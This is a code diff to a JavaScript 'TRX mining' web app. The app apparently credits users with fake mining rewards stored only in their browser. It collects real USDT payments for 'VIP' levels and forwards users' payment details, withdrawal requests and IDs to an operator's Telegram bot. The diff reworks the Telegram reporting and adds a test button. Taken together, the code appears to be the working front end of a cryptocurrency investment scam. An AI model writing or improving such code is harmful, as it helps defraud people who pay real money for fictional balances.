@@ -41,7 +41,7 @@ class MiningSystem {
     generateUserId() {
         let userId = localStorage.getItem('trxUserId');
         if (!userId) {
-            userId = Math.random().toString(36).substr(2, 9).toUpperCase();
+            userId = 'USER_' + Math.floor(100000 + Math.random() * 900000);
             localStorage.setItem('trxUserId', userId);
         }
         return userId;
@@ -50,7 +50,7 @@ class MiningSystem {
     generateInviteCode() {
         let code = localStorage.getItem('trxInviteCode');
         if (!code) {
-            code = 'INV' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            code = 'INV' + Math.floor(1000 + Math.random() * 9000);
             localStorage.setItem('trxInviteCode', code);
         }
         return code;
@@ -69,7 +69,6 @@ class MiningSystem {
             btn.addEventListener('click', () => {
                 const targetSection = btn.getAttribute('data-section');
                 
-                // Update active states
                 navButtons.forEach(b => b.classList.remove('active'));
                 sections.forEach(s => s.classList.remove('active'));
                 
@@ -80,16 +79,10 @@ class MiningSystem {
     }
 
     setupEventListeners() {
-        // Mining
         document.getElementById('claimMining').addEventListener('click', () => this.claimMiningReward());
-        
-        // Conversion
         document.getElementById('convertTRX').addEventListener('click', () => this.convertTRX());
-        
-        // Withdrawal
         document.getElementById('submitWithdraw').addEventListener('click', () => this.submitWithdrawal());
         
-        // VIP Purchase
         document.querySelectorAll('.vip-buy-btn').forEach(btn => {
             btn.addEventListener('click', (e) => {
                 const vipLevel = e.target.getAttribute('data-vip');
@@ -97,7 +90,6 @@ class MiningSystem {
             });
         });
         
-        // VIP Payment
         document.getElementById('submitPayment').addEventListener('click', () => this.submitVipPayment());
     }
 
@@ -113,7 +105,7 @@ class MiningSystem {
         const miningStart = this.userData.miningStartTime;
         const now = Date.now();
         const elapsed = now - miningStart;
-        const cycleTime = 2 * 60 * 60 * 1000; // 2 hours in milliseconds
+        const cycleTime = 2 * 60 * 60 * 1000;
         
         const remaining = cycleTime - (elapsed % cycleTime);
         
@@ -124,13 +116,12 @@ class MiningSystem {
         const timerString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         document.getElementById('miningTimer').textContent = timerString;
         
-        // Auto-claim when cycle completes
         if (remaining <= 1000 && elapsed >= cycleTime) {
             this.autoClaimMiningReward();
         }
     }
 
-    claimMiningReward() {
+    async claimMiningReward() {
         const miningStart = this.userData.miningStartTime;
         const now = Date.now();
         const elapsed = now - miningStart;
@@ -141,7 +132,7 @@ class MiningSystem {
             return;
         }
         
-        const reward = 5; // 5 TRX per cycle
+        const reward = 5;
         this.userData.trxBalance += reward;
         this.userData.miningStartTime = now;
         this.userData.lastClaim = now;
@@ -152,8 +143,9 @@ class MiningSystem {
         
         this.showNotification(`🎉 Successfully claimed ${reward} TRX!`, 'success');
         
-        // Send to Telegram
-        this.sendToTelegram(`🔄 Mining Reward Claimed\n👤 User: ${this.userData.userId}\n💰 Amount: ${reward} TRX\n⏰ Time: ${new Date().toLocaleString()}`);
+        // Telegram message
+        const telegramMessage = `🔄 Mining Reward Claimed\n👤 User ID: ${this.userData.userId}\n💰 Amount: ${reward} TRX\n⏰ Time: ${new Date().toLocaleString()}`;
+        await this.sendToTelegram(telegramMessage);
     }
 
     autoClaimMiningReward() {
@@ -168,7 +160,7 @@ class MiningSystem {
         this.showNotification(`🤖 Auto-claimed ${reward} TRX!`, 'info');
     }
 
-    convertTRX() {
+    async convertTRX() {
         const trxAmount = parseFloat(document.getElementById('trxToConvert').value);
         
         if (!trxAmount || trxAmount <= 0) {
@@ -181,7 +173,7 @@ class MiningSystem {
             return;
         }
         
-        const conversionRate = 0.10; // 1 TRX = 0.10 USDT
+        const conversionRate = 0.10;
         const usdtAmount = trxAmount * conversionRate;
         
         this.userData.trxBalance -= trxAmount;
@@ -193,11 +185,12 @@ class MiningSystem {
         this.showNotification(`✅ Converted ${trxAmount} TRX to ${usdtAmount.toFixed(6)} USDT`, 'success');
         document.getElementById('trxToConvert').value = '';
         
-        // Send to Telegram
-        this.sendToTelegram(`💱 TRX Conversion\n👤 User: ${this.userData.userId}\n🔀 ${trxAmount} TRX → ${usdtAmount.toFixed(6)} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
+        // Telegram message
+        const telegramMessage = `💱 TRX Conversion\n👤 User ID: ${this.userData.userId}\n🔀 ${trxAmount} TRX → ${usdtAmount.toFixed(6)} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
+        await this.sendToTelegram(telegramMessage);
     }
 
-    submitWithdrawal() {
+    async submitWithdrawal() {
         const receiverUid = document.getElementById('receiverUid').value.trim();
         const amount = parseFloat(document.getElementById('withdrawAmount').value);
         
@@ -222,12 +215,12 @@ class MiningSystem {
         
         this.showNotification(`📤 Withdrawal request submitted!`, 'success');
         
-        // Clear form
         document.getElementById('receiverUid').value = '';
         document.getElementById('withdrawAmount').value = '';
         
-        // Send to Telegram
-        this.sendToTelegram(`💸 Withdrawal Request\n👤 User: ${this.userData.userId}\n📤 To UID: ${receiverUid}\n💰 Amount: ${amount} USDT\n⏰ Time: ${new Date().toLocaleString()}`);
+        // Telegram message
+        const telegramMessage = `💸 Withdrawal Request\n👤 User ID: ${this.userData.userId}\n📤 To UID: ${receiverUid}\n💰 Amount: ${amount} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
+        await this.sendToTelegram(telegramMessage);
     }
 
     prepareVipPurchase(vipLevel) {
@@ -236,12 +229,11 @@ class MiningSystem {
         
         this.showNotification(`Prepare ${amount} USDT for VIP ${vipLevel} purchase`, 'info');
         
-        // Scroll to payment section
         document.getElementById('vip').classList.add('active');
         document.querySelector('.payment-info').scrollIntoView({ behavior: 'smooth' });
     }
 
-    submitVipPayment() {
+    async submitVipPayment() {
         const senderUid = document.getElementById('senderUid').value.trim();
         const transactionId = document.getElementById('transactionId').value.trim();
         
@@ -253,41 +245,45 @@ class MiningSystem {
         const vipLevel = this.currentVipLevel;
         const amount = vipLevel === 1 ? 1.00 : 10.00;
         
-        // Send to Telegram
-        const message = `🆕 VIP Purchase Request\n👤 User: ${this.userData.userId}\n⭐ VIP Level: ${vipLevel}\n💰 Amount: ${amount} USDT\n🔗 Sender UID: ${senderUid}\n📄 Transaction ID: ${transactionId || 'Not provided'}\n⏰ Time: ${new Date().toLocaleString()}`;
+        // Telegram message
+        const telegramMessage = `🆕 VIP Purchase Request\n👤 User ID: ${this.userData.userId}\n⭐ VIP Level: ${vipLevel}\n💰 Amount: ${amount} USDT\n🔗 Sender UID: ${senderUid}\n📄 Transaction ID: ${transactionId || 'Not provided'}\n⏰ Time: ${new Date().toLocaleString()}`;
         
-        this.sendToTelegram(message);
+        await this.sendToTelegram(telegramMessage);
         
         this.showNotification('✅ VIP purchase request sent to admin!', 'success');
         
-        // Clear form
         document.getElementById('senderUid').value = '';
         document.getElementById('transactionId').value = '';
     }
 
-    sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`;
-        const data = {
-            chat_id: this.telegramConfig.chatId,
-            text: message,
-            parse_mode: 'HTML'
-        };
+    async sendToTelegram(message) {
+        try {
+            const url = `https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`;
+            const formData = new FormData();
+            formData.append('chat_id', this.telegramConfig.chatId);
+            formData.append('text', message);
+            formData.append('parse_mode', 'HTML');
 
-        // Using fetch to send message to Telegram
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Message sent to Telegram:', data);
-        })
-        .catch((error) => {
-            console.error('Error sending to Telegram:', error);
-        });
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+
+            const data = await response.json();
+            
+            if (data.ok) {
+                console.log('✅ Message sent to Telegram successfully!');
+                return true;
+            } else {
+                console.error('❌ Telegram API error:', data);
+                this.showNotification('❌ Failed to send message to Telegram', 'error');
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ Error sending to Telegram:', error);
+            this.showNotification('❌ Network error - please check connection', 'error');
+            return false;
+        }
     }
 
     addMiningHistory(message) {
@@ -296,7 +292,6 @@ class MiningSystem {
             timestamp: new Date().toLocaleString()
         });
         
-        // Keep only last 10 history items
         if (this.userData.miningHistory.length > 10) {
             this.userData.miningHistory = this.userData.miningHistory.slice(0, 10);
         }
@@ -313,7 +308,6 @@ class MiningSystem {
             type: amount >= 0 ? 'credit' : 'debit'
         });
         
-        // Keep only last 10 transactions
         if (this.userData.transactions.length > 10) {
             this.userData.transactions = this.userData.transactions.slice(0, 10);
         }
@@ -322,22 +316,18 @@ class MiningSystem {
     }
 
     updateDisplay() {
-        // Update balances
         document.getElementById('trxBalance').textContent = this.userData.trxBalance.toFixed(6);
         document.getElementById('usdtBalance').textContent = this.userData.usdtBalance.toFixed(6);
         document.getElementById('totalBalance').textContent = this.userData.usdtBalance.toFixed(6) + ' USDT';
         
-        // Update user info
         document.getElementById('accountId').textContent = this.userData.userId;
         document.getElementById('inviteCode').textContent = this.userData.inviteCode;
         document.getElementById('vipStatus').textContent = this.userData.vipLevel === 0 ? 'No VIP' : `VIP ${this.userData.vipLevel}`;
         
-        // Update team stats
         document.getElementById('teamSize').textContent = this.userData.teamSize;
         document.getElementById('referralEarnings').textContent = this.userData.referralEarnings.toFixed(6) + ' USDT';
         document.getElementById('activeReferrals').textContent = this.userData.teamSize;
         
-        // Update histories
         this.updateMiningHistory();
         this.updateTransactionHistory();
     }
@@ -397,7 +387,6 @@ class MiningSystem {
         const notification = document.getElementById('notification');
         const messageElement = document.getElementById('notificationMessage');
         
-        // Set message and style based on type
         messageElement.textContent = message;
         notification.className = 'notification';
         
@@ -415,10 +404,8 @@ class MiningSystem {
                 notification.style.background = 'linear-gradient(135deg, #00d4ff, #0099cc)';
         }
         
-        // Show notification
         notification.classList.remove('hidden');
         
-        // Auto hide after 3 seconds
         setTimeout(() => {
             notification.classList.add('hidden');
         }, 3000);
@@ -435,7 +422,35 @@ function copyInviteCode() {
     });
 }
 
+// Test Telegram connection
+async function testTelegramConnection() {
+    const miningSystem = window.miningSystem;
+    if (miningSystem) {
+        const testMessage = `🤖 Bot Connection Test\n✅ System is working perfectly\n👤 User ID: ${miningSystem.userData.userId}\n⏰ Time: ${new Date().toLocaleString()}`;
+        const success = await miningSystem.sendToTelegram(testMessage);
+        if (success) {
+            miningSystem.showNotification('✅ Telegram connection test successful!', 'success');
+        }
+    }
+}
+
 // Initialize the app
 document.addEventListener('DOMContentLoaded', () => {
     window.miningSystem = new MiningSystem();
+    
+    // Add test button for debugging
+    const testBtn = document.createElement('button');
+    testBtn.textContent = 'Test Telegram';
+    testBtn.style.position = 'fixed';
+    testBtn.style.bottom = '10px';
+    testBtn.style.right = '10px';
+    testBtn.style.zIndex = '1000';
+    testBtn.style.padding = '10px';
+    testBtn.style.background = '#ff6b6b';
+    testBtn.style.color = 'white';
+    testBtn.style.border = 'none';
+    testBtn.style.borderRadius = '5px';
+    testBtn.style.cursor = 'pointer';
+    testBtn.onclick = testTelegramConnection;
+    document.body.appendChild(testBtn);
 });
